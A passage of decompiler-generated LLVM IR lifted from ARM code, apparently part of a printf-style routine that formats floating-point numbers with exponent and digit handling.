  br label %bb232

bb232:                                            ; preds = %.thread145, %bb231
  br i1 %v3_2ce2c, label %bb233, label %bb234

bb233:                                            ; preds = %bb232
  %v4_2ce3c = load i32, i32* @lr, align 4
  %v5_2ce3c = add i32 %v4_2ce3c, 1
  store i32 %v5_2ce3c, i32* %r0.global-to-local, align 4
  br label %bb234

bb234:                                            ; preds = %bb232, %bb233
  br i1 %v3_2ce38, label %bb235, label %bb236

bb235:                                            ; preds = %bb234
  %v5_2ce40 = add i32 %v4_2ce40144, 2
  store i32 %v5_2ce40, i32* %r2.global-to-local, align 4
  br label %bb236

bb236:                                            ; preds = %bb234, %bb235
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_2ce48 = load i32, i32* %sb.global-to-local, align 4
  %v7_2ce48 = icmp eq i32 %v0_2ce48, 103
  store i1 %v7_2ce48, i1* %cpsr_z.global-to-local, align 1
  %v3_2ce4c = add i32 %v2_2ce4c, 1
  %v4_2ce4c = inttoptr i32 %v3_2ce4c to i8*
  store i8 0, i8* %v4_2ce4c, align 1
  %v0_2ce50 = load i32, i32* %r1.global-to-local, align 4
  %v1_2ce50 = add i32 %v0_2ce50, 1
  store i32 %v1_2ce50, i32* %lr.global-to-local, align 4
  %v0_2ce54 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_2ce54, label %dec_label_pc_2ce58, label %dec_label_pc_2ce80

dec_label_pc_2ce58:                               ; preds = %bb236
  %v0_2ce58 = load i32, i32* %r0.global-to-local, align 4
  %v1_2ce58 = load i32, i32* %ip.global-to-local, align 4
  %v2_2ce58 = sub i32 %v0_2ce58, %v1_2ce58
  %v4_2ce58 = xor i32 %v1_2ce58, %v0_2ce58
  %v5_2ce58 = xor i32 %v2_2ce58, %v0_2ce58
  %v6_2ce58 = and i32 %v5_2ce58, %v4_2ce58
  %v7_2ce58 = icmp slt i32 %v6_2ce58, 0
  %v8_2ce58 = icmp slt i32 %v2_2ce58, 0
  %v9_2ce58 = icmp eq i32 %v0_2ce58, %v1_2ce58
  %v3_2ce5c = xor i1 %v8_2ce58, %v7_2ce58
  %v4_2ce5c = or i1 %v9_2ce58, %v3_2ce5c
  %.258 = zext i1 %v4_2ce5c to i32
  store i32 %.258, i32* %r3.global-to-local, align 4
  %v1_2ce64 = add i32 %v0_2ce58, 4
  %v3_2ce64 = sub i32 0, %v0_2ce58
  %v4_2ce64 = and i32 %v1_2ce64, %v3_2ce64
  %v5_2ce64 = icmp slt i32 %v4_2ce64, 0
  %v6_2ce64 = icmp slt i32 %v1_2ce64, 0
  %v7_2ce64 = icmp eq i32 %v1_2ce64, 0
  store i1 %v7_2ce64, i1* %cpsr_z.global-to-local, align 1
  %v2_2ce68 = xor i1 %v6_2ce64, %v5_2ce64
  br i1 %v2_2ce68, label %.thread21, label %bb239

.thread21:                                        ; preds = %dec_label_pc_2ce58
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_2d19c

bb239:                                            ; preds = %dec_label_pc_2ce58
  %v2_2ce6c = icmp eq i1 %v4_2ce5c, false
  store i1 %v2_2ce6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2ce6c, label %dec_label_pc_2d19c, label %.thread24

.thread24:                                        ; preds = %bb239
  %v3_2ce70 = sub i32 %v1_2ce58, %v0_2ce58
  store i32 %v3_2ce70, i32* %fp.global-to-local, align 4
  store i32 102, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_2ce8c

dec_label_pc_2ce80:                               ; preds = %bb236
  %v0_2ce80 = load i32, i32* %sb.global-to-local, align 4
  %v7_2ce80 = icmp eq i32 %v0_2ce80, 102
  store i1 %v7_2ce80, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_2ce80, i32* %r8.global-to-local, align 4
  br i1 %v7_2ce80, label %dec_label_pc_2ce80.dec_label_pc_2ce8c_crit_edge, label %dec_label_pc_2ce9c

dec_label_pc_2ce80.dec_label_pc_2ce8c_crit_edge:  ; preds = %dec_label_pc_2ce80
  %v0_2ce8c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2ce8c

dec_label_pc_2ce8c:                               ; preds = %.thread24, %dec_label_pc_2ce80.dec_label_pc_2ce8c_crit_edge
  %v0_2ce8c = phi i32 [ %v0_2ce8c.pre, %dec_label_pc_2ce80.dec_label_pc_2ce8c_crit_edge ], [ %v0_2ce58, %.thread24 ]
  %v1_2ce8c = icmp slt i32 %v0_2ce8c, 0
  %v2_2ce8c = icmp eq i32 %v0_2ce8c, 0
  store i1 %v2_2ce8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_2ce8c, label %bb240, label %dec_label_pc_2ce9c

bb240:                                            ; preds = %dec_label_pc_2ce8c
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_2ce94 = load i32, i32* %r2.global-to-local, align 4
  %v6_2ce94 = add i32 %v5_2ce94, -1
  %v7_2ce94 = inttoptr i32 %v6_2ce94 to i8*
  store i8 48, i8* %v7_2ce94, align 1
  %v8_2ce94 = load i32, i32* %r2.global-to-local, align 4
  %v9_2ce94 = add i32 %v8_2ce94, -1
  store i32 %v9_2ce94, i32* %r2.global-to-local, align 4
  %v0_2ce98.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_2cecc.pre.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_2ce9c

dec_label_pc_2ce9c:                               ; preds = %bb240, %dec_label_pc_2ce8c, %dec_label_pc_2d19c, %dec_label_pc_2ce80
  %v1_2cecc = phi i32 [ %v1_2ce50, %dec_label_pc_2ce80 ], [ %v1_2ce50, %dec_label_pc_2d19c ], [ %v1_2cecc.pre.pre, %bb240 ], [ %v1_2ce50, %dec_label_pc_2ce8c ]
  %v1_2cf4430 = phi i32 [ 0, %dec_label_pc_2ce80 ], [ 0, %dec_label_pc_2d19c ], [ %v0_2ce98.pre, %bb240 ], [ %v0_2ce8c, %dec_label_pc_2ce8c ]
  store i32 %v1_2cf4430, i32* %r1.global-to-local, align 4
  store i32 1, i32* %stack_var_-164, align 4
  store i32 176, i32* %r4.global-to-local, align 4
  %v2_2cea8 = ptrtoint i32* %stack_var_-42 to i32
  store i32 %v2_2cea8, i32* %r3.global-to-local, align 4
  %v0_2ceb4 = load i32, i32* %r2.global-to-local, align 4
  %v1_2ceb4 = inttoptr i32 %v0_2ceb4 to i8*
  %v2_2ceb4 = load i8, i8* %v1_2ceb4, align 1
  %v3_2ceb4 = zext i8 %v2_2ceb4 to i32
  store i32 %v3_2ceb4, i32* %r3.global-to-local, align 4
  %v5_2ceb4 = add i32 %v0_2ceb4, 1
  store i32 %v5_2ceb4, i32* %r2.global-to-local, align 4
  %v1_2ceb8 = icmp slt i32 %v1_2cf4430, 0
  %v2_2ceb8 = icmp eq i32 %v1_2cf4430, 0
  store i1 %v2_2ceb8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 %v5_2ceb4, i32* %r6.global-to-local, align 4
  store i32 %v3_2ceb4, i32* %stack_var_-42, align 4
  %v2_2cecc = sub i32 %v1_2cecc, %v5_2ceb4
  store i32 %v2_2cecc, i32* %ip.global-to-local, align 4
  br i1 %v1_2ceb8, label %.thread, label %dec_label_pc_2ced8

.thread:                                          ; preds = %dec_label_pc_2ce9c
  %v5_2ced0 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v5_2ced0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_2cf54

dec_label_pc_2ced8:                               ; preds = %dec_label_pc_2ce9c
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_2cedc = sub i32 %v1_2cf4430, %v2_2cecc
  %v4_2cedc = xor i32 %v2_2cecc, %v1_2cf4430
  %v5_2cedc = xor i32 %v2_2cedc, %v1_2cf4430
  %v6_2cedc = and i32 %v5_2cedc, %v4_2cedc
  %v7_2cedc = icmp slt i32 %v6_2cedc, 0
  %v8_2cedc = icmp slt i32 %v2_2cedc, 0
  %v9_2cedc = icmp eq i32 %v1_2cf4430, %v2_2cecc
  store i1 %v9_2cedc, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-156, align 4
  %v2_2cee8 = xor i1 %v8_2cedc, %v7_2cedc
  br i1 %v2_2cee8, label %dec_label_pc_2cf34, label %dec_label_pc_2ceec

dec_label_pc_2ceec:                               ; preds = %dec_label_pc_2ced8
  store i32 %v2_2cedc, i32* %r2.global-to-local, align 4
  %v2_2cef0 = icmp eq i32 %v2_2cedc, 0
  store i1 %v2_2cef0, i1* %cpsr_z.global-to-local, align 1
  %v2_2cef4 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_2cef4, i32* %lr.global-to-local, align 4
  %tmp241 = icmp slt i32 %v2_2cedc, 1
  br i1 %tmp241, label %.thread148, label %dec_label_pc_2cf08

.thread148:                                       ; preds = %dec_label_pc_2ceec
  %v7_2cefc = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v7_2cefc, i32* %r7.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %.thread34

dec_label_pc_2cf08:                               ; preds = %dec_label_pc_2ceec
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -34541), i32* %r3.global-to-local, align 4
  %v2_2cf18 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_2cf18, i32* %r7.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  store i32 176, i32* %stack_var_-144, align 4
  br label %dec_label_pc_2cf54

dec_label_pc_2cf34:                               ; preds = %dec_label_pc_2ced8
  store i1 %v2_2ceb8, i1* %cpsr_z.global-to-local, align 1
  %v2_2cf38 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_2cf38, i32* %lr.global-to-local, align 4
  br i1 %v2_2ceb8, label %bb242, label %bb243

bb242:                                            ; preds = %dec_label_pc_2cf34
  %v3_2cf40 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v3_2cf40, i32* %r7.global-to-local, align 4
  br label %.thread34

bb243:                                            ; preds = %dec_label_pc_2cf34
  %v3_2cf44 = sub i32 %v2_2cecc, %v1_2cf4430
  store i32 %v3_2cf44, i32* %ip.global-to-local, align 4
  %v3_2cf4863 = add i32 %v5_2ceb4, %v1_2cf4430
  store i32 %v3_2cf4863, i32* %r6.global-to-local, align 4
  %v3_2cf4c = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v3_2cf4c, i32* %r7.global-to-local, align 4
  br label %.thread34

.thread34:                                        ; preds = %.thread148, %bb242, %bb243
  %v1_2cf94265 = phi i32 [ %v3_2cf40, %bb242 ], [ %v3_2cf4c, %bb243 ], [ %v7_2cefc, %.thread148 ]
  %v0_2cf68102 = phi i32 [ %v2_2cecc, %bb242 ], [ %v3_2cf44, %bb243 ], [ 0, %.thread148 ]
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2cf54

dec_label_pc_2cf54:                               ; preds = %.thread, %dec_label_pc_2cf08, %.thread34
  %v1_2cf94 = phi i32 [ %v2_2cf18, %dec_label_pc_2cf08 ], [ %v1_2cf94265, %.thread34 ], [ %v5_2ced0, %.thread ]
  %v0_2cfa8109 = phi i32 [ -1, %dec_label_pc_2cf08 ], [ -1, %.thread34 ], [ %v1_2cf4430, %.thread ]
  %v0_2cf68 = phi i32 [ 0, %dec_label_pc_2cf08 ], [ %v0_2cf68102, %.thread34 ], [ %v2_2cecc, %.thread ]
  %v3_2cf54 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_2cf54, i32* %r2.global-to-local, align 4
  %v1_2cf58 = add i32 %v3_2cf54, 12
  %v2_2cf58 = inttoptr i32 %v1_2cf58 to i32*
  %v3_2cf58 = load i32, i32* %v2_2cf58, align 4
  %v1_2cf5c = and i32 %v3_2cf58, 16
  store i32 %v1_2cf5c, i32* %r4.global-to-local, align 4
  %v2_2cf5c = icmp eq i32 %v1_2cf5c, 0
  %tmp270 = zext i1 %v2_2cf5c to i32
  %.259 = xor i32 %tmp270, 1
  store i32 %.259, i32* %r3.global-to-local, align 4
  %v2_2cf68 = icmp eq i32 %v0_2cf68, 0
  store i1 %v2_2cf68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2cf68, label %bb246, label %.thread37

.thread37:                                        ; preds = %dec_label_pc_2cf54
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_2cf84

bb246:                                            ; preds = %dec_label_pc_2cf54
  store i1 %v2_2cf5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2cf5c, label %dec_label_pc_2cf78, label %dec_label_pc_2cf84

dec_label_pc_2cf78:                               ; preds = %bb246
  %v0_2cf78 = load i32, i32* %sb.global-to-local, align 4
  %v7_2cf78 = icmp eq i32 %v0_2cf78, 103
  store i1 %v7_2cf78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2cf78, label %dec_label_pc_2cfa8, label %bb247

bb247:                                            ; preds = %dec_label_pc_2cf78
  %v1_2cf7c = load i32, i32* %fp.global-to-local, align 4
  %v3_2cf7c = icmp eq i32 %v1_2cf7c, 0
  store i1 %v3_2cf7c, i1* %cpsr_z.global-to-local, align 1
  %tmp248 = icmp slt i32 %v1_2cf7c, 1
  br i1 %tmp248, label %dec_label_pc_2cfa8, label %dec_label_pc_2cf84

dec_label_pc_2cf84:                               ; preds = %.thread37, %bb246, %bb247
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %lr.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -34544), i32* %r3.global-to-local, align 4
  %v2_2cf94 = inttoptr i32 %v1_2cf94 to i32*
  store i32 112, i32* %v2_2cf94, align 4
  %v0_2cf98 = load i32, i32* %r3.global-to-local, align 4
  %v1_2cf98 = add i32 %v0_2cf98, 16
  store i32 %v1_2cf98, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_2cfa0 = load i32, i32* %r7.global-to-local, align 4
  %v1_2cfa0 = add i32 %v0_2cfa0, 4
  %v2_2cfa0 = inttoptr i32 %v1_2cfa0 to i32*
  store i32 1, i32* %v2_2cfa0, align 4
  %v4_2cfa0 = add i32 %v0_2cfa0, 8
  %v5_2cfa0 = inttoptr i32 %v4_2cfa0 to i32*
  %v6_2cfa0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_2cfa0, i32* %v5_2cfa0, align 4
  %v0_2cfa4 = load i32, i32* %r7.global-to-local, align 4
  %v1_2cfa4 = add i32 %v0_2cfa4, 12
  store i32 %v1_2cfa4, i32* %r7.global-to-local, align 4
  %v0_2cfa8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2cfa8

dec_label_pc_2cfa8:                               ; preds = %dec_label_pc_2cf78, %bb247, %dec_label_pc_2cf84
  %v1_2cfc8 = phi i32 [ %v1_2cf94, %bb247 ], [ %v1_2cfa4, %dec_label_pc_2cf84 ], [ %v1_2cf94, %dec_label_pc_2cf78 ]
  %v0_2cfa8 = phi i32 [ %v0_2cfa8109, %bb247 ], [ %v0_2cfa8.pre, %dec_label_pc_2cf84 ], [ %v0_2cfa8109, %dec_label_pc_2cf78 ]
  %v1_2cfa8 = add i32 %v0_2cfa8, 1
  store i32 %v1_2cfa8, i32* %lr.global-to-local, align 4
  %v6_2cfa8 = icmp slt i32 %v1_2cfa8, 0
  %v7_2cfa8 = icmp eq i32 %v1_2cfa8, 0
  store i1 %v7_2cfa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_2cfa8, label %dec_label_pc_2cfb0, label %dec_label_pc_2cfd4

dec_label_pc_2cfb0:                               ; preds = %dec_label_pc_2cfa8
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -34541), i32* %r3.global-to-local, align 4
  %v1_2cfc0 = sub i32 -1, %v0_2cfa8
  store i32 %v1_2cfc0, i32* %r1.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_2cfc8 = inttoptr i32 %v1_2cfc8 to i32*
  store i32 176, i32* %v2_2cfc8, align 4
  %v0_2cfcc = load i32, i32* %r7.global-to-local, align 4
  %v1_2cfcc = add i32 %v0_2cfcc, 4
  %v2_2cfcc = inttoptr i32 %v1_2cfcc to i32*
  %v3_2cfcc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_2cfcc, i32* %v2_2cfcc, align 4
  %v4_2cfcc = add i32 %v0_2cfcc, 8
  %v5_2cfcc = inttoptr i32 %v4_2cfcc to i32*
  %v6_2cfcc = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_2cfcc, i32* %v5_2cfcc, align 4
  %v0_2cfd0 = load i32, i32* %r7.global-to-local, align 4
  %v1_2cfd0 = add i32 %v0_2cfd0, 12
  store i32 %v1_2cfd0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_2cfd4

dec_label_pc_2cfd4:                               ; preds = %dec_label_pc_2cfa8, %dec_label_pc_2cfb0
  %v2_2cfdc = phi i32 [ %v1_2cfc8, %dec_label_pc_2cfa8 ], [ %v1_2cfd0, %dec_label_pc_2cfb0 ]
  %v0_2cfd4 = load i32, i32* %ip.global-to-local, align 4
  %v2_2cfd4 = icmp eq i32 %v0_2cfd4, 0
  store i1 %v2_2cfd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2cfd4, label %.thread46, label %bb249

bb249:                                            ; preds = %dec_label_pc_2cfd4
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_2cfdc = inttoptr i32 %v2_2cfdc to i32*
  store i32 112, i32* %v3_2cfdc, align 4
  %v1_2cfe0 = load i32, i32* %r6.global-to-local, align 4
  %v2_2cfe0 = load i32, i32* %r7.global-to-local, align 4
  %v3_2cfe0 = add i32 %v2_2cfe0, 8
  %v4_2cfe0 = inttoptr i32 %v3_2cfe0 to i32*
  store i32 %v1_2cfe0, i32* %v4_2cfe0, align 4
  %v1_2cfe4 = load i32, i32* %ip.global-to-local, align 4
  %v2_2cfe4 = load i32, i32* %r7.global-to-local, align 4
  %v3_2cfe4 = add i32 %v2_2cfe4, 4
  %v4_2cfe4 = inttoptr i32 %v3_2cfe4 to i32*
  store i32 %v1_2cfe4, i32* %v4_2cfe4, align 4
  %v1_2cfe8 = load i32, i32* %r7.global-to-local, align 4
  %v2_2cfe8 = add i32 %v1_2cfe8, 12
  store i32 %v2_2cfe8, i32* %r7.global-to-local, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_2cfd4, %bb249
  %v1_2d020 = phi i32 [ %v2_2cfdc, %dec_label_pc_2cfd4 ], [ %v2_2cfe8, %bb249 ]
  %v0_2cfec = load i32, i32* %sb.global-to-local, align 4
  %v7_2cfec = icmp eq i32 %v0_2cfec, 103
  store i1 %v7_2cfec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2cfec, label %dec_label_pc_2cff4, label %dec_label_pc_2cffc

dec_label_pc_2cff4:                               ; preds = %.thread46
  %v0_2cff4 = load i32, i32* %r4.global-to-local, align 4
  %v2_2cff4 = icmp eq i32 %v0_2cff4, 0
  store i1 %v2_2cff4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2cff4, label %dec_label_pc_2d02c, label %dec_label_pc_2cffc

dec_label_pc_2cffc:                               ; preds = %.thread46, %dec_label_pc_2cff4
  %v0_2cffc = load i32, i32* %lr.global-to-local, align 4
  %v1_2cffc = load i32, i32* %ip.global-to-local, align 4
  %v2_2cffc = sub i32 %v1_2cffc, %v0_2cffc
  store i32 %v2_2cffc, i32* %r1.global-to-local, align 4
  %v1_2d000 = load i32, i32* %fp.global-to-local, align 4
  %v2_2d000 = sub i32 %v2_2cffc, %v1_2d000
  %v4_2d000 = xor i32 %v1_2d000, %v2_2cffc
  %v5_2d000 = xor i32 %v2_2d000, %v2_2cffc
  %v6_2d000 = and i32 %v5_2d000, %v4_2d000
  %v7_2d000 = icmp slt i32 %v6_2d000, 0
  %v8_2d000 = icmp slt i32 %v2_2d000, 0
  %v9_2d000 = icmp eq i32 %v2_2cffc, %v1_2d000
  store i1 %v9_2d000, i1* %cpsr_z.global-to-local, align 1
  %v2_2d004 = xor i1 %v8_2d000, %v7_2d000
  br i1 %v2_2d004, label %dec_label_pc_2d008, label %dec_label_pc_2d02c

dec_label_pc_2d008:                               ; preds = %dec_label_pc_2cffc
  %v2_2d014 = sub i32 %v1_2d000, %v2_2cffc
  store i32 %v2_2d014, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -34541), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_2d020 = inttoptr i32 %v1_2d020 to i32*
  store i32 176, i32* %v2_2d020, align 4
  %v0_2d024 = load i32, i32* %r7.global-to-local, align 4
  %v1_2d024 = add i32 %v0_2d024, 4
  %v2_2d024 = inttoptr i32 %v1_2d024 to i32*
  %v3_2d024 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_2d024, i32* %v2_2d024, align 4
  %v4_2d024 = add i32 %v0_2d024, 8
  %v5_2d024 = inttoptr i32 %v4_2d024 to i32*
  %v6_2d024 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_2d024, i32* %v5_2d024, align 4
  %v0_2d028 = load i32, i32* %r7.global-to-local, align 4
  %v1_2d028 = add i32 %v0_2d028, 12
  store i32 %v1_2d028, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_2d02c

dec_label_pc_2d02c:                               ; preds = %dec_label_pc_2cffc, %dec_label_pc_2cff4, %dec_label_pc_2d008
  %v1_2d0c0.pre.pre = phi i32 [ %v1_2d020, %dec_label_pc_2cffc ], [ %v1_2d020, %dec_label_pc_2cff4 ], [ %v1_2d028, %dec_label_pc_2d008 ]
  %v0_2d02c = load i32, i32* %r8.global-to-local, align 4
  %v7_2d02c = icmp eq i32 %v0_2d02c, 102
  store i1 %v7_2d02c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2d02c, label %dec_label_pc_2d0b4, label %dec_label_pc_2d034

dec_label_pc_2d034:                               ; preds = %dec_label_pc_2d02c
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_2d038 = load i32, i32* %r0.global-to-local, align 4
  %v1_2d038 = icmp slt i32 %v0_2d038, 0
  %v2_2d038 = icmp eq i32 %v0_2d038, 0
  store i1 %v2_2d038, i1* %cpsr_z.global-to-local, align 1
  %v4_2d03c = select i1 %tmp275, i32 %v4_2cd58126130, i32 101
  store i32 %v4_2d03c, i32* %r4.global-to-local, align 4
  store i32 0, i32* %stack_var_-47, align 4
  %v4_2d04c = sub i32 0, %v0_2d038
  %storemerge158 = select i1 %v1_2d038, i32 %v4_2d04c, i32 %v0_2d038
  %tmp271 = ashr i32 %v0_2d038, 31
  %tmp272 = and i32 %tmp271, 2
  %tmp273 = add nuw nsw i32 %tmp272, 43
  store i32 %storemerge158, i32* %r5.global-to-local, align 4
  store i32 %tmp273, i32* %sl.global-to-local, align 4
  %v2_2d054 = ptrtoint i32* %stack_var_-47 to i32
  store i32 %v2_2d054, i32* %r6.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_2d05c

dec_label_pc_2d05c:                               ; preds = %dec_label_pc_2d08c, %dec_label_pc_2d05c, %dec_label_pc_2d034
  %v2_2d074 = phi i32 [ %v2_2d054, %dec_label_pc_2d034 ], [ %v6_2d074, %dec_label_pc_2d05c ], [ %v6_2d074, %dec_label_pc_2d08c ]
  %v0_2d06c = phi i32 [ %storemerge158, %dec_label_pc_2d034 ], [ %v2_2d078, %dec_label_pc_2d05c ], [ %v2_2d078, %dec_label_pc_2d08c ]
  %v3_2d064 = urem i32 %v0_2d06c, 10
  %v1_2d068 = or i32 %v3_2d064, 48
  store i32 %v1_2d068, i32* %r3.global-to-local, align 4
  store i32 %v0_2d06c, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_2d074 = trunc i32 %v1_2d068 to i8
  %v3_2d074 = add i32 %v2_2d074, -1
  %v4_2d074 = inttoptr i32 %v3_2d074 to i8*
  store i8 %v1_2d074, i8* %v4_2d074, align 1
  %v5_2d074 = load i32, i32* %r6.global-to-local, align 4
  %v6_2d074 = add i32 %v5_2d074, -1
  store i32 %v6_2d074, i32* %r6.global-to-local, align 4
  %v0_2d078 = load i32, i32* %r0.global-to-local, align 4
  %v1_2d078 = load i32, i32* %r1.global-to-local, align 4
  %v2_2d078 = sdiv i32 %v0_2d078, %v1_2d078
  store i32 %v2_2d078, i32* %r0.global-to-local, align 4
  %v0_2d07c = load i32, i32* %r8.global-to-local, align 4
  %v1_2d07c = add i32 %v0_2d07c, 1
  store i32 %v1_2d07c, i32* %r8.global-to-local, align 4
  %v7_2d080 = icmp eq i32 %v1_2d07c, 3
  store i1 %v7_2d080, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_2d078, i32* %r5.global-to-local, align 4
  br i1 %v7_2d080, label %dec_label_pc_2d05c, label %dec_label_pc_2d08c

dec_label_pc_2d08c:                               ; preds = %dec_label_pc_2d05c
  %v2_2d08c = icmp eq i32 %v2_2d078, 0
  store i1 %v2_2d08c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2d08c, label %dec_label_pc_2d094, label %dec_label_pc_2d05c

dec_label_pc_2d094:                               ; preds = %dec_label_pc_2d08c
  %v1_2d094 = add i32 %v5_2d074, -2
  store i32 %v1_2d094, i32* %r3.global-to-local, align 4
  %v0_2d098 = load i32, i32* %sl.global-to-local, align 4
  %v1_2d098 = trunc i32 %v0_2d098 to i8
  %v4_2d098 = inttoptr i32 %v1_2d094 to i8*
  store i8 %v1_2d098, i8* %v4_2d098, align 1
  %v0_2d09c = load i32, i32* %r3.global-to-local, align 4
  %v1_2d09c = add i32 %v0_2d09c, -1
  store i32 %v1_2d09c, i32* %r2.global-to-local, align 4
  %v0_2d0a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_2d0a0 = trunc i32 %v0_2d0a0 to i8
  %v4_2d0a0 = inttoptr i32 %v1_2d09c to i8*
  store i8 %v1_2d0a0, i8* %v4_2d0a0, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_2d0a8 = load i32, i32* %r7.global-to-local, align 4
  %v1_2d0a8 = inttoptr i32 %v0_2d0a8 to i32*
  store i32 112, i32* %v1_2d0a8, align 4
  %v3_2d0a8 = add i32 %v0_2d0a8, 4
  %v4_2d0a8 = inttoptr i32 %v3_2d0a8 to i32*
  %v5_2d0a8 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v5_2d0a8, i32* %v4_2d0a8, align 4
  %v0_2d0ac = load i32, i32* %r2.global-to-local, align 4
  %v1_2d0ac = load i32, i32* %r7.global-to-local, align 4
  %v2_2d0ac = add i32 %v1_2d0ac, 8
  %v3_2d0ac = inttoptr i32 %v2_2d0ac to i32*
  store i32 %v0_2d0ac, i32* %v3_2d0ac, align 4
  %v0_2d0b0 = load i32, i32* %r7.global-to-local, align 4
  %v1_2d0b0 = add i32 %v0_2d0b0, 12
  store i32 %v1_2d0b0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_2d0b4

dec_label_pc_2d0b4:                               ; preds = %dec_label_pc_2d02c, %.thread124, %dec_label_pc_2d094
  %v1_2d0c0.pre = phi i32 [ %v2_2cb8c, %.thread124 ], [ %v1_2d0b0, %dec_label_pc_2d094 ], [ %v1_2d0c0.pre.pre, %dec_label_pc_2d02c ]
  %v2_2d0b4 = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v2_2d0b4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_2d0b8

dec_label_pc_2d0b8:                               ; preds = %dec_label_pc_2d0b8, %dec_label_pc_2d0b4
  %v0_2d0b8 = phi i32 [ %v2_2d0b4, %dec_label_pc_2d0b4 ], [ %v4_2d0b8, %dec_label_pc_2d0b8 ]
  %stack_var_-188.0 = phi i32 [ %v3_2ca28, %dec_label_pc_2d0b4 ], [ %v2_2d0c4, %dec_label_pc_2d0b8 ]
  %v1_2d0b8 = inttoptr i32 %v0_2d0b8 to i32*
  %v2_2d0b8 = load i32, i32* %v1_2d0b8, align 4
  store i32 %v2_2d0b8, i32* %r3.global-to-local, align 4
  %v4_2d0b8 = add i32 %v0_2d0b8, 12
  store i32 %v4_2d0b8, i32* %r2.global-to-local, align 4
  %v3_2d0c0 = icmp ult i32 %v4_2d0b8, %v1_2d0c0.pre
  %v2_2d0c4 = sub i32 %stack_var_-188.0, %v2_2d0b8
  store i32 %v2_2d0c4, i32* %ip.global-to-local, align 4
  br i1 %v3_2d0c0, label %dec_label_pc_2d0b8, label %dec_label_pc_2d0d0

dec_label_pc_2d0d0:                               ; preds = %dec_label_pc_2d0b8
  %v3_2d0d0 = load i8, i8* %stack_var_-46, align 1
  %v4_2d0d0 = sext i8 %v3_2d0d0 to i32
  store i32 %v4_2d0d0, i32* %r3.global-to-local, align 4
  store i32 %v4_2d0d0, i32* %r2.global-to-local, align 4
  %v2_2d0d4 = icmp eq i8 %v3_2d0d0, 0
  store i1 %v2_2d0d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2d0d4, label %bb254, label %bb253

bb253:                                            ; preds = %dec_label_pc_2d0d0
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb254

bb254:                                            ; preds = %dec_label_pc_2d0d0, %bb253
  %v1_2d134 = phi i32 [ %v4_2d0d0, %dec_label_pc_2d0d0 ], [ 1, %bb253 ]
  %v2_2d0dc = sub i32 %v2_2d0c4, %v1_2d134
